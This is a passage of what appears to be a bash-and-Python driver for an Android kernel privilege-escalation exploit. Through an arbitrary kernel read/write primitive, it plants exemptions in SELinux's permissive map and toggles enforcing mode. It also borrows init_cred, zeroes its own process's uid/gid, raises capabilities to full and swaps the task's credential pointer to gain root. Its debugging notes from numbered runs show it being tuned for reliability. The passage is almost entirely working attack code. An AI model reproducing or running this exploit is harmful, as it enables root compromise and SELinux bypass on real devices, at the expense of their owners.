EXIST=$(python3 "$ROOT/permmap7.py" decode --head "$(wlist "$MH" | tr -s '\n' ' ')" $NODEARGS 2>/dev/null | sed -n 's/^EXISTING=//p' | tail -n 1)
printf '  already exempt: [%s]  (merged, never dropped)\n' "${EXIST:-none}"
BUILD=$(python3 "$ROOT/permmap7.py" build --bits "$EXEMPT_BITS" --base "$NODE_BASE" --keep "${EXIST:-}" --order "$MAPORDER")
printf '%s\n' "$BUILD" | grep -av '^{' | sed 's/^/  planned: /'
NJSON=$(printf '%s\n' "$BUILD" | tail -n 1)
HEADHEX=$(printf '%s\n' "$NJSON" | python3 -c "import json,sys;print(json.load(sys.stdin)['head'])")
i=0
for pay in $(printf '%s\n' "$NJSON" | python3 -c "import json,sys;print(' '.join(json.load(sys.stdin)['nodes']))"); do
	ADDR=$(python3 -c "print(hex(int('$NODE_BASE',16) + 64*$i))")
	OK=no
	for k in 1 2 3; do
		fire "$ADDR" "$pay" || true
		BL=$(read_at "$ADDR") || true
		# a read window is 256 hex chars; the node is its first 128.  Comparing the whole window to a
		# 128-char payload is what made run 44 report "never landed" on a write that may well have.
		# The sampler prints each u32 with %08x; a payload is a BYTE string.  Comparing them directly
		# is a category error and it cost two runs their correct verdicts: run 45's node 0 read back
		# "01a41c40 ffffffc0 00000003..." which IS the payload "401ca401c0ffffff030000..." -- the
		# write landed.  Convert the payload to the same word notation before comparing.
		WANTW=$(python3 -c "
p='$pay'
print(''.join(p[i:i+8][6:8]+p[i:i+8][4:6]+p[i:i+8][2:4]+p[i:i+8][0:2] for i in range(0,len(p),8)))
")
		GOT=$(wlist "$BL" | tr -d ' \n'); GOT=${GOT:0:${#WANTW}}
		[ "$GOT" = "$WANTW" ] && { OK=yes; break; }
		printf '  node %d read back %s, want %s -- re-firing\n' "$i" "${GOT:0:40}" "${WANTW:0:40}"
	done
	[ "$OK" = yes ] || { printf 'ABORT: node %d at %s never read back as built (got %s want %s)\n' "$i" "$ADDR" "${GOT:-none}" "${WANTW:-?}" >&2; exit 1; }
	printf '  PASS: node %d @%s reads back byte-exact\n' "$i" "$ADDR"
	i=$((i + 1))
done
OK=no
for k in 1 2 3; do
	fire "$PERM_MAP" "$HEADHEX" || true
	MH2=$(read_at "$PERM_MAP") || true
	HHW=$(python3 -c "
p='$HEADHEX'
print(''.join(p[i:i+8][6:8]+p[i:i+8][4:6]+p[i:i+8][2:4]+p[i:i+8][0:2] for i in range(0,len(p),8)))
")
	HH=$(wlist "$MH2" | tr -d ' \n'); HH=${HH:0:${#HHW}}
	[ "$HH" = "$HHW" ] && { OK=yes; break; }
	printf '  head read back %s, want %s\n' "$HH" "$HEADHEX"
	printf '  head read-back differs, re-firing\n'
done
[ "$OK" = yes ] || { printf 'ABORT: permissive_map head never landed\n' >&2; exit 1; }
# the real witness is not "my bytes are there" but "decoding the map out of kernel memory says these
# types are exempt": re-walk the NEW chain and ask the same tool
NP=$(python3 "$ROOT/permmap7.py" decode --head "$(wlist "$MH2" | tr -s '\n' ' ')" | sed -n 's/.*NODEPTR=\(0x[0-9a-f]*\).*/\1/p')
NEWNODES=""
for i in 1 2 3 4; do
	[ -n "$NP" ] && [ "$NP" != "0x0" ] || break
	RL=$(read_at "$NP") || break
	RH=$(wlist "$RL" | tr -d ' \n'); RH=${RH:0:128}
	[ ${#RH} -eq 128 ] || break
	NEWNODES="$NEWNODES --node $RH"
	NP=$(python3 "$ROOT/permmap7.py" node --hex "$RH" | sed -n 's/.*NEXT=\(0x[0-9a-f]*\).*/\1/p')
done
AFTER=$(python3 "$ROOT/permmap7.py" decode --head "$(wlist "$MH2" | tr -s '\n' ' ')" $NEWNODES 2>/dev/null | sed -n 's/^EXISTING=//p' | tail -n 1)
printf '  map decoded back out of the kernel: [%s]\n' "${AFTER:-<nothing>}"
MISS=""
for bit in ${EXEMPT_BITS//,/ }; do
	case ",$AFTER," in *",$bit,"*) ;; *) MISS="$MISS $bit";; esac
done
[ -z "$MISS" ] || { printf 'ABORT: after planting, these types still do not read as exempt:%s\n' "$MISS" >&2; exit 1; }
printf '  PASS: every wanted type (%s) reads back exempt from the live map\n' "$EXEMPT_BITS"
if [ "${ENFORCE_BACK:-0}" = 1 ]; then
	printf '  putting selinux_enforcing back to 1 -- from here the ladder runs under Enforcing\n'
	for k in 1 2 3; do
		fire "$SELINUX_ENFORCING" 01000000 || true
		GE=$(SH  getenforce 2>/dev/null | tr -d '\r' || true)
		[ "$GE" = Enforcing ] && break
		printf '  getenforce says %s, re-firing\n' "$GE"
	done
	GE=$(SH  getenforce 2>/dev/null | tr -d '\r' || true)
	[ "$GE" = Enforcing ] || { printf 'ABORT: asked to run Enforcing but getenforce says %s\n' "$GE" >&2; exit 1; }
	printf '  getenforce now: %s -- the borrowed task is now a kernel-domain task under Enforcing\n' "$GE"
	for k in 1 2 3 4 5 6 7 8; do
		sleep 4
		S2X=$(qline)
		if grep -q "sb=$SBMARK" <<<"$S2X"; then
			printf '  PASS: the borrowed task is STILL ANSWERING under Enforcing (this is the witness)\n'
			printf '    %s\n' "${S2X:0:120}"
			break
		fi
		[ "$k" = 8 ] && { printf 'ABORT: the borrowed task went silent once Enforcing came back -- exemption did not take\n' >&2; exit 1; }
	done
fi

printf '\n=== 4. calibration: read the half of init_cred we did NOT modify ===\n'
# usage(+0x00) and securebits(+0x24) are ours now, so a byte-exact expectation starts past them:
# cred+0x28 = the cap words, jit_keyring, the four keyring slots, security, user, user_ns, group_info.
S=$(read_at "$(addr_add "$INIT_CRED" 0x28)") || exit 1
W=$(wlist "$S" | tr -s '\n' ' ')
EXP=$(python3 - "$IMG" "$INIT_CRED" "$NGRP" "$TB" <<'PY'
import struct, sys
img, cred, ng, tb = sys.argv[1:5]
data = open(img, 'rb').read()
off = int(cred, 16) - int(tb, 16) + 0x28
print(" ".join("%08x" % struct.unpack_from("<I", data, off + 4 * i)[0] for i in range(int(ng))))
PY
)
printf '  read back: %s\n  Image says : %s\n' "$W" "$EXP"
S4=$W
# Runtime values legitimately differ from the file image (init_cred is pruned at boot, its ->security
# is filled, and WE overwrote ->group_info), so Image equality is NOT a valid gate.  The gate is a
# known answer WE planted: step 2 wrote the group_info base into init_cred+0x88, so a read aimed at
# +0x28 must show that pointer's own halves at word (0x88-0x28)/4 = 24/25.  Nothing but a correct aim,
# a correct blocks[] dereference and a correct LE word order can produce that.
python3 - "$W" "$GIVA" "$NGRP" <<'EOF'
import sys
w, giva, ng = sys.argv[1].split(), int(sys.argv[2], 16), int(sys.argv[3])
assert len(w) >= ng, "short read: %d words, want %d" % (len(w), ng)
lo, hi = "%08x" % (giva & 0xffffffff), "%08x" % (giva >> 32)
got = w[(0x88 - 0x28) // 4:(0x88 - 0x28) // 4 + 2]
assert got == [lo, hi], ("cred+0x88 does not hold the group_info we planted: read %s, want %s %s "
                         "-- aim/deref/byte-order is not what SyS_getgroups says") % (got, lo, hi)
assert w[0] == "00000000" and w[1] == "00000000", "cap_inheritable not zero at +0x28: %s %s" % (w[0], w[1])
caps = [(w[(o - 0x28) // 4], w[(o - 0x28) // 4 + 1]) for o in (0x30, 0x38, 0x40)]
assert [c[1] for c in caps] == ["0000003f"] * 3, "cap hi words are %s, want 0000003f" % [c[1] for c in caps]
print("  PASS: cred+0x88 = %s_%s == the group_info we planted -> aim, deref and LE word order confirmed"
      % (hi, lo))
print("  PASS: layout at the aim is the cred layout (+0x28 inh=0, three cap pairs with hi=0x3f)")
print("  NOTE: cap low words %s vs the Image ffffffff -- pruned at boot, so the Image is a SHAPE witness"
      % [c[0] for c in caps])
print("        only; the numeric calibration is this task's own /proc face, at step 5b")
EOF
[ $? -eq 0 ] || { printf 'ABORT: the bytes at our aim do not carry the cred layout -- the read is not real\n' >&2; exit 1; }

printf '\n=== 5. our own task, then our own cred ===\n'
# addr_add() parses BOTH arguments base 16, so an offset must arrive as a hex literal: run 20 would
# have asked for TASK+0x1160 from $(( 0x490 - 8 )) (decimal 1160 read as hex).
S=$(read_at "$(addr_add "$TASK" 0x488)") || exit 1
if [ "$(( 0x$(wAt "$S" 8) ))" != "$HPID" ]; then printf 'ABORT: pid read does not match the needle\n' >&2; exit 1; fi
printf '  PASS: pid@task+0x490 == %s (planted by the needle, so the task is ours)\n' "$HPID"
S=$(read_at "$(addr_add "$TASK" $OFF_TASK_REALCRED)") || exit 1
ORIG=$(words2u64 "$(wAt "$S" 0)" "$(wAt "$S" 4)")
printf '  real_cred@task+0x658 = %s\n' "$ORIG"
inband "$ORIG" || { printf 'ABORT: real_cred outside the kernel VA band\n' >&2; exit 1; }
PRE=$(SH  "grep -a 'pre : ' $OUT 2>/dev/null" 2>&1 | tr -d '\r' || true)
printf '%s\n' "$PRE" | sed 's/^/  proc face: /'
# Run 21 died exactly here, and the reason is the MATCHER, not the kernel: show_creds prints
# "  pre :   Uid:\t...", i.e. three spaces after the colon, so `grep 'pre : Uid'` never matched, and
# under `set -o pipefail` a no-match grep makes the whole assignment fail -> set -e killed the driver
# one step before the patch.  PRE is now parsed by python with a tolerant regex, no shell pipeline.
S=$(read_at "$ORIG") || exit 1
printf '%s\n' "$S" | sed 's/^/  sample(+00): /'
# A 32-word read aimed at +0x00 stops at +0x7c, so the pointers at +0x70/+0x78/+0x80/+0x88 are NOT in
# it -- run 24 aborted because my gate asked for +0x88 out of that read.  Second read, from +0x50.
S2=$(read_at "$(addr_add "$ORIG" 0x50)") || exit 1
printf '%s\n' "$S2" | sed 's/^/  sample(+50): /'

# cred+0x70 (our own task_security_struct) and init_cred+0x78 (root_user) are both taken from reads
# that came back through the channel -- not typed -- so step 6 can only aim at objects the kernel
# itself showed us.
TSEC=$(python3 - "$(wlist "$S2" | tr -s '\n' ' ')" <<'TS'
import sys
w = sys.argv[1].split()
i = (0x70 - 0x50) // 4
print(hex(int(w[i + 1], 16) << 32 | int(w[i], 16)))
TS
)
inband "$TSEC" || { printf 'ABORT: cred->security read back as %s, not a kernel pointer\n' "$TSEC" >&2; exit 1; }
ROOT_USER=$(python3 - "$S4" <<'RU'
import sys
w = sys.argv[1].split()
i = (0x78 - 0x28) // 4
print(hex(int(w[i + 1], 16) << 32 | int(w[i], 16)))
RU
)
inband "$ROOT_USER" || { printf 'ABORT: init_cred->user read back as %s, not a kernel pointer\n' "$ROOT_USER" >&2; exit 1; }
printf '  our cred->security (task_security_struct) = %s   init_cred->user (root_user) = %s\n' "$TSEC" "$ROOT_USER"

# Gates on this step are the planted ones (pid@+0x490 above, step 4's group_info answer).  The cap
# columns are a REPORT: a shell cred reads CapEff = 0, so two matching zero words would prove
# nothing.  Those offsets get certified causally at step 6, where we write +0x28..+0x47 and the
# holder's own post-exec /proc face must then answer 0000003fffffffff.
python3 - "$ORIG" "$INIT_CRED" "$(wlist "$S" | tr -s '\n' ' ')" "$(wlist "$S2" | tr -s '\n' ' ')" "$PRE" <<'PY'
import sys, re
orig, init_cred, words, ptr, pre = (sys.argv[1], sys.argv[2], sys.argv[3].split(),
                                    sys.argv[4].split(), sys.argv[5])
def w(off): return words[off // 4] if off // 4 < len(words) else None
def u64(off):
    a, b = w(off), w(off + 4)
    return None if a is None or b is None else int(b, 16) << 32 | int(a, 16)
def proc(key):
    m = re.search(r'pre\s*:\s*%s:\s*([^\n]+)' % key, pre)
    return m.group(1).strip() if m else "?"
def p64(off):                     # off relative to the cred base; the +0x50 read covers >= 0x50
    i = (off - 0x50) // 4
    if i < 0 or i + 1 >= len(ptr):
        return None
    return int(ptr[i + 1], 16) << 32 | int(ptr[i], 16)
for o in (0x28, 0x30, 0x38, 0x40, 0x48):
    v = u64(o)
    print("  cred+0x%02x = %s" % (o, "?" if v is None else "%016x" % v))
for o in (0x70, 0x78, 0x80, 0x88):
    v = p64(o)
    print("  cred+0x%02x = %s" % (o, "?" if v is None else "%016x" % v))
print("  /proc of this task, before the borrow: Uid=[%s] Gid=[%s] CapEff=%s CapBnd=%s"
      % (proc("Uid"), proc("Gid"), proc("CapEff"), proc("CapBnd")))
print("  id words +0x04..+0x20: %s" % " ".join("+%02x=%s" % (o, w(o)) for o in range(0x04, 0x24, 4)))
# Safety gates for step 6: the object to edit in place must be OURS, its group_info must be a real
# in-band pointer (we leave it alone, getgroups will use it), and the read must reach +0x23.
assert int(orig, 16) != int(init_cred, 16), "real_cred IS init_cred -- there is nothing of ours to patch"
gi = p64(0x88)
sec = p64(0x70)
assert sec is not None and 0xffffff8000000000 <= sec < 0xffffffd000000000, \
    "security@+0x70 = %s is not in-band -- fork/exec dereferences it" % sec
assert gi is not None and 0xffffff8000000000 <= gi < 0xffffffd000000000, \
    "group_info@+0x88 = %s is not an in-band pointer -- this cred is not what we think it is" % gi
assert all(w(o) is not None for o in range(0x04, 0x24, 4)), "read too short to cover +0x04..+0x23"
print("  PASS: this cred is ours, its group_info is a real in-band pointer, and the read covers the")
print("        id words step 6 zeroes -- safe to edit in place")
PY
[ $? -eq 0 ] || { printf 'ABORT: the cred we are about to edit does not look like ours\n' >&2; exit 1; }

printf '\n=== 6. edit our OWN cred in place, READ IT BACK, then swap the cred pointer ===\n'
# One write covers the id words and securebits (+0x04..+0x27 = 36 zero bytes), one covers the four
# cap words (+0x28..+0x47 = 0x0000003fffffffff each, built with struct so the LE order cannot be
# mistyped).  64 B is this window's ceiling (tools/clobber.c uses buf[64]), so nothing is longer.
# The patch is then WITNESSED by reading the same cred back through the channel, which exists only
# until the pointer swap: "CLOBBER OK" says the primitive fired, not that the word landed (ledger 498).
ZERO36=$(python3 -c "print('00'*36)")
CAPS32=$(python3 -c "import struct;print(struct.pack('<QQQQ',*([0x3fffffffff]*4)).hex())")
# CAPMODE=keep  -> ids only, capabilities untouched (the shell keeps eff=0/permitted=0/bset=0xc0).
# Anything else -> the full shape we used in runs 26-28.  This is the one-factor switch that decides
# whether the guard keys on uid==0 or on the capability set we raised.
FSUIDMODE=${FSUIDMODE:-full}	# only = leave uid/gid/euid/egid at 2000, zero just fsuid/fsgid
CAPMODE=${CAPMODE:-full}	# keep = do not touch a single capability word
USERMODE=${USERMODE:-own}	# pin  = cred->user := root_user (its __count is inflated first)
SIDMODE=${SIDMODE:-own}		# init = our tsec->sid := SIDVAL (default 593, claimed "init")
SIDVAL=${SIDVAL:-593}
printf '  FSUIDMODE=%s CAPMODE=%s USERMODE=%s SIDMODE=%s SIDVAL=%s\n' "$FSUIDMODE" "$CAPMODE" "$USERMODE" "$SIDMODE" "$SIDVAL"
LANDED=0
for ROUNDP in 1 2 3; do
	if [ "$FSUIDMODE" = only ]; then
		# 8 zero bytes over fsuid(+0x14) and fsgid(+0x18) only.  uid/gid/euid/egid stay 2000, so
		# getuid() will NOT answer 0 -- the ladder's second trigger (syscall(SYS_setfsuid,-1)) is
		# what has to fire instead.  ngroups/group_info/caps/securebits are all left alone.
		fire "$(addr_add "$ORIG" 0x14)" "$(python3 -c "print('00'*8)")" || true
	else
		fire "$(addr_add "$ORIG" 0x04)" "$ZERO36" || true
	fi
	[ "$CAPMODE" = keep ] || fire "$(addr_add "$ORIG" 0x28)" "$CAPS32" || true
	if [ "$USERMODE" = pin ]; then
		# struct user_struct starts with atomic_t __count: inflate it BEFORE pointing at it, so the
		# free_uid() this task owes can never reach zero (same fail-safe as init_cred->usage, ledger
		# 504: a write that misses yields a wrong read, never a kfree of a static object).
		fire "$ROOT_USER" "$(python3 -c "import struct;print(struct.pack('<I',0x11111111).hex())")" || true
		fire "$(addr_add "$ORIG" 0x78)" "$(le64_hex $ROOT_USER)" || true
	fi
	# Read our own task_security_struct back before anything else changes it.  With the device-side
	# context known independently (id prints "context=u:r:shell:s0"), word 0 has to be shell's type
	# index -- that is the runtime confirmation the offline walker alone could not give (ledger 498).
	ST=$(read_at "$TSEC") || true
	if [ -n "$ST" ]; then
		printf '%s\n' "$ST" | sed 's/^/  tsec sample: /'
		python3 - "$(wlist "$ST" | tr -s '\n' ' ')" "$SHELL_SID" <<'TSW'
import sys
w, want = sys.argv[1].split(), int(sys.argv[2])
sid = [int(x, 16) for x in w[:8]]
print("    tsec words: osid=%d sid=%d exec_sid=%d create_sid=%d keycreate=%d sockcreate=%d %d %d"
      % (sid[0], sid[1], sid[2], sid[3], sid[4], sid[5], sid[6], sid[7]))
print("    expected osid = %d (this task's own `id` already says context=u:r:shell:s0, so the kernel"
      % want)
print("      must be holding shell's index here) -> %s" % ("MATCH, so the tsec layout and the number"
                                                           if sid[0] == want else "DIFFER"))
TSW
	fi
	if [ "$SIDMODE" != own ]; then
		# task_security_struct = {osid, sid, exec_sid, create_sid, keycreate_sid, sockcreate_sid},
		# six u32: sid is +0x04.  4-byte store, so atomicity is not a question.  osid(+0x00) is left
		# alone on purpose -- it is the label we came from and hooks that compare it should keep
		# seeing shell.
		SIDL=$(python3 -c "import struct;print(struct.pack('<I',$SIDVAL).hex())")
		SIDW=0
		for _t in 1 2 3; do
			fire "$(addr_add "$TSEC" 0x04)" "$SIDL" || true
			ST=$(read_at "$TSEC") || true
			SIDW=$(python3 - "$(wlist "$ST" | tr -s '\n' ' ')" <<'SW'
import sys
w = sys.argv[1].split()
print(int(w[1], 16) if len(w) > 1 else -1)
SW
)
			[ "$SIDW" = "$SIDVAL" ] && break
			printf '  sid read back as %s, want %s -- re-firing\n' "$SIDW" "$SIDVAL"
		done
		[ "$SIDW" = "$SIDVAL" ] || { printf 'ABORT: tsec->sid never landed (read %s)\n' "$SIDW" >&2; exit 1; }
		printf '  PASS: tsec->sid reads back %s through the channel (osid still %s)\n' "$SIDVAL" "$(python3 - "$(wlist "$ST" | tr -s '\n' ' ')" <<'SO'
import sys
w = sys.argv[1].split()
print(int(w[0], 16) if w else -1)
SO
)"
	fi
	S=$(read_at "$ORIG") || true
	if python3 - "$ORIG" "$(wlist "$S" | tr -s '\n' ' ')" "$CAPMODE" <<'PY'
import sys
orig, w = sys.argv[1], sys.argv[2].split()
FULL, FHI = "%08x" % (0x3fffffffff & 0xffffffff), "%08x" % (0x3fffffffff >> 32)
# The kernel clamps credential capability words to the boot cap_bset (0x0000003f0000fffe here, which
# is also what init_cred carries at runtime) WITHIN THE TWO SECONDS before this read-back: run 25
# demanded the literal value we wrote, called a landed patch "not landed", and refused to swap.
# So the witness is "the caps rose to at least the clamp ceiling", and which ceiling we got is the
# finding -- never "equals my payload byte for byte".
CLAMP, CHI = "%08x" % (0x3f0000fffe & 0xffffffff), "%08x" % (0x3f0000fffe >> 32)
bad = []
if len(w) < 0x48 // 4 + 1:
    print("    read back only %d words" % len(w)); sys.exit(1)
ONLY = len(sys.argv) > 6 and sys.argv[6] == "only"
if ONLY:
    # what this mode promises: fsuid/fsgid zeroed, the four visible ids UNTOUCHED at 2000
    for o in (0x14, 0x18):
        if w[o // 4] != "00000000":
            bad.append("+%s=%s want 00000000 (fsuid/fsgid)" % (hex(o), w[o // 4]))
    for o in (0x04, 0x08, 0x0c, 0x10):
        if w[o // 4] != "000007d0":
            bad.append("+%s=%s want 000007d0 untouched (uid/gid/euid/egid)" % (hex(o), w[o // 4]))
else:
    for o in range(0x04, 0x28, 4):
        if w[o // 4] != "00000000":
            bad.append("+%s=%s want 00000000" % (hex(o), w[o // 4]))
got = []
KEEP = len(sys.argv) > 3 and sys.argv[3] == "keep"
for o in (0x28, 0x30, 0x38, 0x40):
    lo, hi = w[o // 4], w[o // 4 + 1]
    if KEEP:
        print("    cap word: +%s=%s %s (left alone -- CAPMODE=keep)" % (hex(o), lo, hi))
        continue
    if (lo, hi) == (FULL, FHI):
        got.append("+%s=full(as written)" % hex(o))
    elif (lo, hi) == (CLAMP, CHI):
        got.append("+%s=clamp 0000003f0000fffe (kernel caps creds at the boot bset)" % hex(o))
    else:
        bad.append("+%s=%s %s want %s %s or %s %s" % (hex(o), lo, hi, FULL, FHI, CLAMP, CHI))
for g in got:
    print("    cap word: %s" % g)
for b in bad:
    print("    mismatch: %s" % b)
print("    NOTE: 0x3f0000fffe has SETUID/SETGID/SETPCAP/NET_ADMIN/NET_RAW but NOT CAP_CHOWN(bit0)")
sys.exit(1 if bad else 0)
PY
	then
		LANDED=1
		printf '  PASS: cred@%s carries the patch in mode FSUIDMODE=%s CAPMODE=%s USERMODE=%s SIDMODE=%s (round %s); cells as reported above\n' "$ORIG" "$FSUIDMODE" "$CAPMODE" "$USERMODE" "$SIDMODE" "$ROUNDP"
		break
	fi
	printf '  round %s: patch not fully landed -- re-firing\n' "$ROUNDP"
done
[ "$LANDED" = 1 ] || { printf 'ABORT: the in-place patch never landed; refusing to swap the cred pointer\n' >&2; exit 1; }
# Swapping task->cred back to OUR (patched) cred also ends the borrow, so the kernel domain goes back
# to u:r:shell:s0 with uid 0 and full caps.  The last three writes return the shared objects: init_cred
# loses our marker, the borrowed group_info goes back to ngroups=0 (no deref) with a NULL block.
fire "$(addr_add "$TASK" $OFF_TASK_CRED)" "$(le64_hex $ORIG)" || exit 1
fire "$(addr_add "$INIT_CRED" $OFF_CRED_SB)" 00000000 || exit 1
fire "$GIVA" "$(python3 -c "import struct;print(struct.pack('<III',2,0,1).hex())")" || exit 1
fire "$(addr_add "$GIVA" $OFF_GI_BLOCKS)" "$(le64_hex 0)" || exit 1
printf '  channel torn down (init_cred securebits/group_info restored); waiting for the holder to finish its ladder\n'
for _ in $(seq 1 $((HOLD / 4))); do
	SH  "grep -aq 'EXIT=' $OUT" >/dev/null 2>&1 && break || true
	sleep 4
done
SH  "grep -aE 'ROOTED|EXIT=|step [AC]|probe [0-9]+: SELFUID|post :|  Uid:|  Gid:|CapEff|CapBnd' $OUT" 2>&1 | tr -d '\r' | tail -n 30 | sed 's/^/  /' || true
printf '  what the kernel itself logged around the holder dying (Permissive => dmesg is readable):\n'
SH  "sed -n '/DMESG-BEGIN/,/DMESG-END/p' $OUT" 2>&1 | tr -d '\r' | sed 's/^/    dmesg: /' || true
printf '  the raw ladder markers -- written through the fd opened while this task was still uid 2000,\n'
printf '  so a marker can only be missing if the CALL ITSELF never returned:\n'
SH  "grep -a '^M ' $QF 2>/dev/null" 2>&1 | tr -d '\r' | sed 's/^/    lad: /' || true
printf '  what the forked child said about itself:\n'
SH  "cat $DEV/child.txt 2>&1" 2>&1 | tr -d '\r' | sed 's/^/    child: /' || true
printf '  what the IN-PLACE execve said about itself:\n'
SH  "cat $DEV/inplace.txt 2>&1" 2>&1 | tr -d '\r' | sed 's/^/    inplace: /' || true

printf '\n=== 7. outside witnesses ===\n'
SH  "ps -A -o USER,PID,NAME 2>/dev/null | grep -w $HPID" 2>&1 | tr -d '\r' | sed 's/^/  ps: /' || true
SH  "ls -ld /proc/$HPID 2>&1" 2>&1 | tr -d '\r' | sed 's/^/  /' || true
SH  "cat /data/local/tmp/probe.uid 2>&1" 2>&1 | tr -d '\r' | sed 's/^/  probe child: /' || true
SH  "getenforce" 2>&1 | tr -d '\r' | sed 's/^/  getenforce: /' || true
SH  "dmesg | grep -cE 'Internal error|Oops|BUG:|kernel panic|Unable to handle'" 2>&1 | tr -d '\r' | sed 's/^/  fault lines: /' || true

printf '\n=== 9. give the borrowed objects back ===\n'
# The repair already put task->cred back to ours, so these two only undo our own scribble on the
# shared init_cred: its securebits (the holder's poll marker) and the group_info pointer we aimed at
# our group_info.  Losing them costs nothing but a dirtier state until the next reboot.
fire "$(addr_add "$INIT_CRED" $OFF_CRED_SB)" 00000000 || true
fire_ptr "$(addr_add "$INIT_CRED" $OFF_CRED_GRP)" "$INIT_GROUPS" || true
